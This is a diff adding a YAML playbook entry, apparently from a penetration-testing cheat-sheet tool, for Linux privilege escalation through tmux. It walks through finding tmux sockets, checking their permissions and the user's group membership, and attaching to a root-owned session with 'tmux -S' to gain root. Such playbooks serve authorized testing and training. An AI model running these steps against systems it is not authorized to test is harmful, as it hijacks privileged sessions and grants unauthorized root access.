@@ -1,0 +1,82 @@
+name: Linux Privilege Escalation - Tmux
+
+steps:
+
+# =========================================================
+# [1] ENUMERATE TMUX
+# =========================================================
+- title: Enumerate Tmux Sessions
+  mode: enum
+  info: |
+    Look for tmux sessions owned by privileged users.
+
+  entries:
+
+    - cmd: "ps aux | grep tmux"
+      info: identify running tmux sessions
+
+      look_for:
+        - "root-owned tmux sessions"
+        - "custom socket paths (-S)"
+        - "shared sessions"
+
+    - cmd: "find / -type s 2>/dev/null | grep tmux"
+      info: locate tmux sockets
+
+    - cmd: "ls -la /shareds"
+      info: inspect socket permissions
+
+      look_for:
+        - "group writable socket"
+        - "root ownership"
+
+  notes:
+    - tmux sockets are Unix socket files
+    - weak socket permissions can allow session hijacking
+    - common in dev/debug environments
+
+# =========================================================
+# [2] CHECK GROUP MEMBERSHIP
+# =========================================================
+- title: Check Group Access
+  mode: chain
+  info: |
+    Verify access to the tmux socket group.
+
+  entries:
+
+    - cmd: "id"
+      info: check current groups
+
+      look_for:
+        - "matching group on tmux socket"
+        - "devs"
+        - "adm"
+        - "docker"
+
+  notes:
+    - group membership is usually enough
+    - if you can read/write the socket, you can attach
+
+# =========================================================
+# [3] ATTACH TO SESSION
+# =========================================================
+- title: Attach To Tmux Session
+  mode: chain
+  info: |
+    Attach to the privileged tmux session.
+
+  entries:
+
+    - cmd: "tmux -S /shareds"
+      info: connect to shared tmux socket
+
+    - cmd: "id"
+      info: verify privileges inside session
+
+      look_for:
+        - "uid=0(root)"
+
+  notes:
+    - replace /shareds with discovered socket path
+    - if root left the session open, this is instant privesc
